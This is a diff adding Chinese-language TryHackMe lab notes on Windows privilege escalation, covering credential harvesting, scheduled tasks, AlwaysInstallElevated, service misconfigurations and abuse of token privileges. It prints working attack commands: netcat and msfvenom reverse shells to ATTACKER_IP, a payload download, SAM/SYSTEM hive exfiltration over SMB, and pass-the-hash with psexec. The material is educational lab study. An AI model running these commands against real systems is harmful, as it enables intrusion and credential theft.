@@ -947,3 +947,707 @@ root@ip-10-49-164-182:/tmp# cat /home/matt/flag7.txt
 THM-89384012
 root@ip-10-49-164-182:/tmp#
 ```
+
+## Windows提权
+
+### 账户类型
+
+根据访问权限级别，可将用户划分至以下组别之一：
+
+1. Administrators：这类用户拥有最高权限，能够修改任意系统配置参数，并访问系统内的所有文件。
+2. Standard Users：这类用户可以登录使用计算机，但仅能执行有限的操作。通常情况下，这类用户无法对系统做出永久性或关键性修改，且仅能操作自身所属的文件。
+
+拥有管理员权限的所有用户都隶属于管理员组。而标准用户则隶属于用户组。
+
+除此之外，在权限提升的相关场景中，你通常还会了解到操作系统所使用的一些特殊内置账户：
+
+- SYSTEM / LocalSystem：操作系统用于执行内部任务的账户。该账户可完全访问主机上的所有文件和资源，拥有比管理员更高的权限。
+- Local Service：它专门用来运行那些不需要访问网络、也不需要高权限的本地服务（比如：远程桌面服务、字体缓存服务）。如果它试图访问网络上的其他机器，它会表现为匿名（Anonymous）。别人不认识它，所以它拿不到任何网络资源。
+- Network Service：本地权限和上面的 Local Service 一样，都非常低。它的特殊之处在于网络访问。当它访问局域网内的其他机器时，它会出示“计算机凭据”（也就是这台电脑在域里的身份，通常表现为 机器名$）。用于运行需要和外界通信的服务（比如：DNS 客户端、某些 Web 服务）。如果你拿到了 Network Service 权限，你就有可能利用这台机器在域（Domain）里的身份去攻击其他的服务器。
+
+这些账户由 Windows 系统创建和管理，你无法像使用其他普通账户一样使用它们。不过在部分场景下，可通过利用特定服务来获取这类账户的权限。
+
+### 从常见位置提取密码
+
+获取其他用户权限最简单的方式，就是从已被入侵的设备中收集账号凭证。这类凭证的留存原因有很多，比如粗心的用户将凭证随意存放在明文文件中，或是被浏览器、邮件客户端等软件自动保存。
+
+#### Unattended Windows Installations
+
+无人值守 Windows 安装是一种允许在不需要用户交互的情况下自动安装操作系统的方法。简单来说，通常安装 Windows 时需要你手动选择语言、输入序列号、分区、创建用户名等。而“无人值守安装”则通过一个预先配置好的应答文件（Answer File）自动完成所有这些步骤。
+
+应答文件的可能位置：
+
+- C:\Unattend.xml
+- C:\Windows\Panther\Unattend.xml
+- C:\Windows\Panther\Unattend\Unattend.xml
+- C:\Windows\system32\sysprep.inf
+- C:\Windows\system32\sysprep\sysprep.xml
+
+文件中可能发现：
+
+```
+<Credentials>
+    <Username>Administrator</Username>
+    <Domain>thm.local</Domain>
+    <Password>MyPassword123</Password>
+</Credentials>
+```
+
+#### Powershell Hisroty
+
+每当用户使用 PowerShell 执行命令时，该命令会被保存到一个记录历史命令的文件中。这便于快速重复执行此前使用过的命令。如果用户在 PowerShell 命令行中直接输入包含密码的命令，后续可在 cmd.exe 命令提示符中通过以下命令查看该密码：
+
+```
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+注意：上述命令仅能在命令提示符（cmd.exe）中运行，PowerShell 无法识别 %userprofile% 这个环境变量。若要在 PowerShell 中读取该文件，需将 %userprofile% 替换为 $Env:userprofile。
+
+```
+C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+ls
+whoami
+whoami /priv
+whoami /group
+whoami /groups
+cmdkey /?
+cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
+cmdkey /list
+cmdkey /delete:thmdc.local
+cmdkey /list
+runas /?
+```
+
+#### 已保存的 Windows 凭据
+
+Windows 允许我们使用其他用户的凭据。该功能还支持将这些凭据保存在系统中。以下命令可列出已保存的凭据：
+
+```
+cmdkey /list
+```
+
+虽然无法查看实际密码，但如果发现有值得尝试的凭据，你可以结合 runas 命令和 /savecred 参数来使用这些凭据，具体操作如下所示。
+
+```
+runas /savecred /user:admin cmd.exe
+```
+
+```
+C:\Users\thm-unpriv>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=WPRIVESC1\mike.katz
+    Type: Domain Password
+    User: WPRIVESC1\mike.katz
+
+
+C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
+Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
+
+C:\Users\thm-unpriv>
+```
+
+#### IIS 配置
+
+互联网信息服务（IIS）是 Windows 系统安装后自带的默认网页服务器。IIS 上的网站配置信息存储在名为 web.config 的文件中，该文件还可存放数据库密码或各类已配置的身份验证机制密码。根据所安装的 IIS 版本不同，web.config 文件可在以下任一路径中找到：
+
+- C:\inetpub\wwwroot\web.config
+- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+以下是在该文件中快速查找数据库连接字符串的方法：
+
+```
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+```
+C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
+                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+    <connectionStrings>
+        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
+    </connectionStrings>
+```
+
+#### 从 PuTTY 软件中提取凭据
+
+PuTTY 是 Windows 系统上常用的一款 SSH 客户端。用户无需每次都手动指定连接参数，可以保存会话信息，将 IP 地址、用户名及其他配置项存储下来以备后续使用。
+
+PuTTY 不支持保存 SSH 登录密码，但会保存包含明文认证凭据的代理配置。很多公司环境下需要通过代理服务器才能访问外网或内网。在 PuTTY 的 Connection -> Proxy 配置页中，可以设置代理服务器的用户名和密码。PuTTY 会将这些代理身份验证凭据以明文（Cleartext）的形式存储在注册表中。
+
+若要获取已保存的代理凭据，可通过以下命令在注册表项中搜索 ProxyPassword 字段：
+
+```
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+注意：Simon Tatham是 PuTTY 的开发者（其名字是文件路径的一部分），并非我们要检索密码所对应的用户名。执行上述命令后，也能看到已保存的代理用户名。
+
+和 PuTTY 会存储凭证一样，所有具备密码保存功能的软件，包括浏览器、邮件客户端、FTP 客户端、SSH 客户端、VNC 远程控制软件等，都存在可以恢复用户已保存密码的方式。
+
+```
+C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
+    ProxyExcludeList    REG_SZ
+    ProxyDNS    REG_DWORD    0x1
+    ProxyLocalhost    REG_DWORD    0x0
+    ProxyMethod    REG_DWORD    0x0
+    ProxyHost    REG_SZ    proxy
+    ProxyPort    REG_DWORD    0x50
+    ProxyUsername    REG_SZ    thom.smith
+    ProxyPassword    REG_SZ    CoolPass2021
+    ProxyTelnetCommand    REG_SZ    connect %host %port\n
+    ProxyLogToTerm    REG_DWORD    0x1
+
+End of search: 10 match(es) found.
+```
+
+### CTF技巧
+
+权限提升并非总是一件难事。部分配置错误可让你获取更高权限的用户访问权限，在某些情况下甚至能获得管理员权限。你可以将这类情况更多归属于 CTF 竞赛场景，而非真实渗透测试工作中会遇到的场景。不过，如果前文提到的所有方法都无效，你始终可以尝试利用这类配置错误进行权限提升。
+
+#### Scheduled Tasks
+
+查看目标系统中的计划任务时，你可能会发现某条计划任务缺失了可执行文件，或是正在使用一个你能够修改的可执行文件。
+
+使用 schtasks 命令列出所有计划任务。若要获取任意服务的详细信息，可以使用如下命令：
+
+```
+C:\> schtasks /query /tn vulntask /fo list /v
+Folder: \
+HostName:                             THM-PC1
+TaskName:                             \vulntask
+Task To Run:                          C:\tasks\schtask.bat
+Run As User:                          taskusr1
+```
+
+你会获取到该计划任务的大量相关信息，但对我们而言关键在于待执行任务参数和运行身份用户参数；前者用于指定计划任务所要运行的程序，后者则显示执行该任务所使用的用户账户。
+
+如果当前登录用户能够修改或覆盖待执行任务对应的可执行文件，我们就可以控制 taskusr1 用户执行任意程序，进而实现简单的权限提升。可使用 icacls 命令查看该可执行文件的文件权限：
+
+```
+C:\> icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+```
+
+从结果中可以看出，BUILTIN\Users 用户组对该任务的可执行文件拥有完全访问权限（F）。这意味着我们可以修改这个批处理文件，并植入任意所需的载荷。为方便操作，nc64.exe 程序位于 C:\tools 目录下。接下来我们修改批处理文件，生成一个反向 Shell：
+
+```
+C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+```
+
+#### AlwaysInstallElevated
+
+Windows 安装程序文件（也称为 MSI 文件）用于在系统中安装应用程序。这类文件通常以启动者当前的用户权限级别运行,如果安装过程中需要写入系统目录，它会弹窗找你要管理员密码。
+
+但如果系统管理员开启了一个特殊的策略（AlwaysInstallElevated），那么任何用户运行任何 MSI 文件，Windows 都会自动给这个安装程序 SYSTEM（最高权限）。
+
+此方法需要设置两个注册表项。你可以使用下方的命令在命令行中查询这两个注册表项。
+
+```
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+若要利用此漏洞，必须同时设置这两项注册表项，否则无法完成漏洞利用。完成设置后，可通过 msfvenom 工具生成恶意.msi 安装程序文件，具体操作如下：
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+
+由于这是反向会话，你还需要运行已完成对应配置的漏洞利用框架监听模块。将生成的文件传输完成后，可使用以下命令运行安装程序，从而获取反向会话：
+
+```
+C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
+
+### 滥用服务配置
+
+#### Windows Services
+
+Windows 服务由服务控制管理器（SCM）进行管理。服务控制管理器是一个系统进程，负责根据需求管控服务状态、查看任意指定服务的当前运行状态，同时提供服务配置的通用管理方式。
+
+Windows 设备上的每项服务都对应一个可执行文件，服务启动时该可执行文件会由服务控制管理器调用运行。需要重点注意的是，服务可执行文件需内置专用接口函数，才能与服务控制管理器建立通信，因此并非任意可执行文件都能成功作为服务启动。此外，每项服务都会指定自身运行所依托的用户账户。
+
+为更好地理解服务的组成结构，我们可以使用 sc qc 命令查看 apphostsvc 服务的配置信息：
+
+```
+C:\> sc qc apphostsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: apphostsvc
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Application Host Helper Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem
+```
+
+在这里可以看到，相关的可执行文件通过BINARY_PATH_NAME参数指定，而运行该服务所使用的账户则在SERVICE_START_NAME参数中显示。
+
+所有服务配置均存储在注册表路径`HKLM\SYSTEM\CurrentControlSet\Services`下。
+
+#### 服务可执行文件权限不安全
+
+如果某项服务关联的可执行文件权限配置过弱，允许攻击者修改或替换该文件，攻击者便可轻易获取该服务账户的权限。
+
+为理解其中原理，我们以 Splinterware 系统调度程序中发现的一处漏洞为例进行说明。首先，我们将使用 sc 命令查询服务配置：
+
+```
+C:\> sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcuser1
+```
+
+注意：PowerShell 中将 sc 用作 Set-Content 的别名，因此若要通过这种方式在 PowerShell 中控制服务，必须使用 sc.exe。
+
+我们可以看到，该漏洞软件所安装的服务以 svcuser1 用户身份运行，且该服务对应的可执行文件路径为 C:\Progra~2\System~1\WService.exe。接下来我们检查该可执行文件的权限（右键-属性-安全，也能看到）：
+
+```
+C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+接下来我们发现了一个关键漏洞。Everyone用户组对该服务的可执行文件拥有修改权限（M）。这意味着我们可以随意用任意恶意载荷覆盖该文件，而服务会以配置用户账户的权限去执行这个载荷。
+
+我们可以使用 msfvenom 生成一个服务类型可执行文件载荷，并通过 Python 网页服务器进行托管，注意这里是-f exe-service而不是exe：
+
+```
+user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+
+user@attackerpc$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+随后我们可以通过以下命令从 PowerShell 中获取载荷：
+
+```
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+```
+
+一旦载荷传入 Windows 服务器，我们就开始用自身载荷替换服务可执行文件。由于需要其他用户来运行该载荷，我们还需为Everyone用户组授予完全控制权限：
+
+```
+C:\> cd C:\PROGRA~2\SYSTEM~1\
+
+C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+
+我们在攻击机上开启反向监听：
+
+```
+user@attackerpc$ nc -lvp 4445
+```
+
+最后，重启该服务。在常规情况下，你通常需要等待服务自动重启，而在模拟场景中，可自行手动重启服务以节省时间。请在 cmd.exe 命令提示符中执行以下命令：
+
+```
+C:\> sc stop windowsscheduler
+C:\> sc start windowsscheduler
+```
+
+#### 未使用引号的路径
+
+即便我们无法像以往那样直接向服务可执行文件中写入内容，仍可以借助一个较为冷门的特性，强行让服务运行任意可执行程序。
+
+在配置 Windows 服务时，若服务指向无引号包裹的可执行文件路径，会出现一种特殊的运行机制。所谓无引号包裹，指关联可执行文件的路径没有添加规范引号，无法适配命令行路径中包含空格的情况。
+
+举个例子，我们来看两种服务配置的差异。第一种服务采用了规范的引号格式，服务控制管理器能够明确识别并执行路径为C:\Program Files\RealVNC\VNC Server\vncserver.exe的二进制程序，同时加载后续附带的参数：
+
+```
+C:\> sc qc "vncserver"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: vncserver
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : VNC Server
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+
+现在我们来看另一个未使用规范引号的服务：
+
+```
+C:\> sc qc "disk sorter enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+```
+
+当服务控制管理器尝试执行关联的可执行文件时，就会出现问题。由于 “Disk Sorter Enterprise” 文件夹名称中包含空格，命令会产生歧义，服务控制管理器无法确定你实际想要执行的是以下哪一项：
+
+- C:\MyPrograms\Disk.exe
+- C:\MyPrograms\Disk Sorter.exe
+- C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+
+这与命令提示符解析命令的方式有关。通常情况下，当你发送一条命令时，空格会被用作参数分隔符，除非空格属于带引号字符串的一部分。这意味着，对未加引号的命令的正确解析方式是：运行 C:\MyPrograms\Disk.exe，并将其余内容当作参数处理。
+
+服务控制管理器本理应执行失败，却并未如此，反而尝试为用户提供适配，按照下表所示顺序逐个搜索可执行程序：
+
+- 首先，查找路径：C:\MyPrograms\Disk.exe。若该文件存在，服务将运行此可执行程序。
+- 若上述文件不存在，则继续查找路径：C:\MyPrograms\Disk Sorter.exe。若该文件存在，服务将运行此可执行程序。
+- 若上述文件仍不存在，则继续查找路径：C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe。该查找方式通常能够成功匹配，在默认安装环境下一般都会运行此程序。
+
+从该运行行为中，安全问题已十分明显。若攻击者在系统检索预期服务可执行文件之前，提前创建任意一个被检索路径下的可执行文件，便可诱导服务运行任意指定的可执行程序。
+
+这一漏洞原理看似简单，但绝大多数服务可执行文件默认会安装在 C:\Program Files 或 C:\Program Files (x86) 目录下，普通无权限用户无法对这些目录进行写入操作，因此能够避免存在漏洞的服务被恶意利用。但该规则也存在例外情况：
+
+- 部分安装程序会修改安装目录的权限配置，导致相关服务产生安全漏洞。
+- 管理员可能将服务程序文件安装到非默认路径，若该路径允许所有用户写入，此漏洞就能够被恶意利用。
+
+在本次场景中，管理员将磁盘分类工具的二进制程序安装在了 c:\MyPrograms 目录下。默认情况下，该目录会继承 C:\ 根目录的权限，允许任意用户在其中创建文件和文件夹。我们可以通过 icacls 命令来查看权限配置：
+
+```
+C:\>icacls c:\MyPrograms
+c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
+              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+\Users 拥有 AD 和 WD 权限，分别允许用户创建子目录和文件。说明可以创建反弹shell。
+
+#### 服务权限不安全
+
+查看一个服务的权限控制：
+
+```
+C:\tools\AccessChk> accesschk64.exe -qlc thmservice
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+```
+
+在这里可以看到 /Users 拥有完全服务访问权限，这意味着任何用户都可以重新配置该服务。
+
+接着制作反弹shell程序，把服务的二进制替换进来：
+
+```
+C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
+
+C:\> sc stop THMService
+C:\> sc start THMService
+```
+
+这里obj=LocalSystem是让服务以system权限运行。
+
+### 滥用危险权限
+
+#### windows权限
+
+权限是账户拥有的、执行特定系统相关操作的权利。这些操作既可以是关闭设备这类简单权限，也可以是绕过部分基于自主访问控制列表（DACL）的访问控制权限。
+
+每位用户都拥有一组已分配的权限，可通过以下命令进行查看：
+
+```
+PS E:\> whoami /priv
+
+特权信息
+----------------------
+
+特权名                        描述                 状态
+============================= ==================== ======
+SeShutdownPrivilege           关闭系统             已禁用
+SeChangeNotifyPrivilege       绕过遍历检查         已启用
+SeUndockPrivilege             从扩展坞上取下计算机 已禁用
+SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
+SeTimeZonePrivilege           更改时区             已禁用
+```
+
+https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants 这里查看 Windows 系统可用权限的完整列表。
+
+从攻击者的角度来看，只有那些能够用于系统权限提升的权限才具备利用价值。你可以在 https://github.com/gtworek/Priv2Admin 中找到可被利用权限的完整清单。
+
+这里仅演示如何滥用日常最常见的部分系统权限。
+
+#### SeBackup / SeRestore
+
+备份权限与还原权限可让用户无视系统中已设置的任意访问控制，对系统内所有文件进行读写操作。设置这类权限的初衷，是让特定用户无需获得完整管理员权限，就能对系统数据开展备份工作。
+
+攻击者一旦拥有该权限，便能借助多种手段轻易在系统中完成权限提升。本文介绍的方法是复制安全账户管理器注册表配置单元与系统注册表配置单元，以此提取本地管理员的密码哈希值。
+
+演示：
+
+攻击机开启smbserver：
+
+```
+root@ip-10-48-113-135:~# mkdir share
+root@ip-10-48-113-135:~# python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+靶机：
+
+```
+
+C:\Windows\system32>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+
+C:\Windows\system32>reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
+
+C:\Windows\system32>copy C:\Users\THMBackup\sam.hive \\10.48.113.135\public\
+        1 file(s) copied.
+
+C:\Windows\system32>copy C:\Users\THMBackup\system.hive \\10.48.113.135\public\
+        1 file(s) copied.
+```
+
+借助 Impacket 工具获取用户密码哈希值，最终可以利用管理员哈希值执行哈希传递攻击，并以系统权限获取目标主机的访问权限：
+
+```
+root@ip-10-48-113-135:~/share# ls
+sam.hive  system.hive
+root@ip-10-48-113-135:~/share# python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
+THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
+[*] Cleaning up...
+root@ip-10-48-113-135:~/share# python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.48.131.77
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Requesting shares on 10.48.131.77.....
+[*] Found writable share ADMIN$
+[*] Uploading file PifOPaKJ.exe
+[*] Opening SVCManager on 10.48.131.77.....
+[*] Creating service nzlB on 10.48.131.77.....
+[*] Starting service nzlB.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+#### SeTakeOwnership
+
+SeTakeOwnership可让用户取得系统内任意对象的所有权，其中包含文件与注册表项，这为攻击者提权创造了诸多可乘之机。举例来说，攻击者能够查找以系统权限运行的服务，并获取该服务可执行文件的所有权。
+
+确认有SeTakeOwnershipPrivilege：
+
+```
+C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+```
+
+获取某个程序的所有权：
+
+```
+C:\> takeown /f C:\Windows\System32\Utilman.exe
+
+SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
+```
+
+成为文件所有者并不意味着你一定拥有该文件的操作权限，但身为所有者，你可以为自己分配所需的任意权限。若要为当前用户授予对 utilman.exe 文件的完全访问权限，可使用以下命令：
+
+```
+C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+processed file: Utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+
+在此之后，我们将用 cmd.exe 的副本替换 utilman.exe：
+
+```
+C:\Windows\System32\> copy cmd.exe utilman.exe
+        1 file(s) copied.
+```
+
+接着锁定屏幕，点击轻松使用，就会弹出system权限的cmd了，因为utilman程序是system权限运行的。
+
+#### SeImpersonate / SeAssignPrimaryToken
+
+1. 核心概念与原理
+
+什么是 Token (令牌)？
+
+- Windows 系统中账户的“身份证”，决定了进程或线程拥有的安全上下文与访问权限。
+
+SeImpersonatePrivilege (身份模拟特权)
+
+- 定义：允许一个进程在受到其他用户连接时，“冒充”或“借用”该用户的 Token 来代表其执行操作。
+
+- 典型合法场景 (FTP 示例)：
+
+    - FTP 服务运行在低权限账户（如 ftp）下。
+    - 当用户 Ann 登录时，FTP 服务利用该特权临时切换为 Ann 的身份去读写其个人文件。这样既保证了权限隔离，又避免了 ftp 账户本身权限过大。
+
+- 默认拥有者：常见于高信任的服务账户，如 NT AUTHORITY\LOCAL SERVICE、NT AUTHORITY\NETWORK SERVICE 以及 IIS 网站中间件账户（IIS APPPOOL\DefaultAppPool）。
+
+2. 漏洞利用边界 (攻击者视角)
+
+如果你通过 WebShell 等方式拿到一个权限很低、但手握 SeImpersonatePrivilege 的服务账户，即可尝试向 SYSTEM 最高权限发起冲击。
+
+提权的必要条件：
+    - 在本地运行一个进程，作为接收端（诱饵）。
+    - 强迫或诱骗一个高权限账户（如 SYSTEM）连接该接收端。
+    - 利用 SeImpersonate 特权窃取并复制该高权限账户的 Token，从而以其身份执行任意代码。
+
+3. 实战案例：RogueWinRM 提权
+
+利用机制：
+    - Windows 的 BITS（后台智能传输服务） 在被任意用户启动时，默认会以 SYSTEM 权限去连接本地的 5985 端口（WinRM 服务的默认端口）。
+    - 如果目标机器上原本没有开启 WinRM 服务，攻击者就可以抢占 5985 端口设下埋伏。
+
+步骤 1：在攻击机（Kali）上开启监听
+
+```
+nc -lvp 4442
+```
+
+步骤 2：在靶机（Windows WebShell）上执行漏洞利用程序：
+
+```
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+```
+
+### 利用漏洞软件
+
+目标系统中安装的各类软件可能存在多种权限提升漏洞。和驱动程序一样，企业与用户对这类软件的更新频率，往往远低于操作系统的更新频率。你可以使用 wmic 工具查看目标系统内已安装的软件及其版本信息。下方这条命令能够导出可采集到的已安装软件相关信息（执行完成大约需要一分钟）：
+
+```
+wmic product get name,version,vendor
+```
+
+请记住，wmic product 命令可能无法列出所有已安装程序。部分程序因安装方式不同，不会在此处显示。务必查看桌面快捷方式、可用服务，以及一切能够表明存在其他潜在易受攻击软件的相关痕迹。
+
+收集到软件版本信息后，我们可以前往漏洞数据库网站、数据包风暴平台或是谷歌等各类网络平台，在线检索对应已安装软件已公开的漏洞利用程序。
+
+### 自动化工具
+
+目前有多款脚本可采用与上一任务类似的方式开展系统信息枚举工作。这类工具能够缩短信息枚举耗时，还可挖掘各类潜在的权限提升途径。但需注意，自动化工具有时会遗漏部分权限提升漏洞。
+
+以下是几款常用于排查权限提升途径的常用工具：
+
+#### WinPEAS
+
+WinPEAS 是一款用于枚举目标系统、寻找提权路径的脚本。你可以查询更多关于 WinPEAS 的相关信息，还能下载预编译可执行文件或是批处理脚本。WinPEAS 会执行与上一任务中所列内容相近的命令，并输出执行结果。该工具输出的内容篇幅较长，有时还不易阅读。因此按照如下方式将输出结果重定向保存至文件中，是十分规范的操作方式：
+
+```
+C:\> winpeas.exe > outputfile.txt
+```
+
+下载地址：https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+
+#### PrivescCheck
+
+PrivescCheck 是一款 PowerShell 脚本，用于在目标系统中排查常见的权限提升漏洞。它可作为 WinPEAS 的替代工具，且无需运行二进制程序。
+
+下载地址：https://github.com/itm4n/PrivescCheck
+
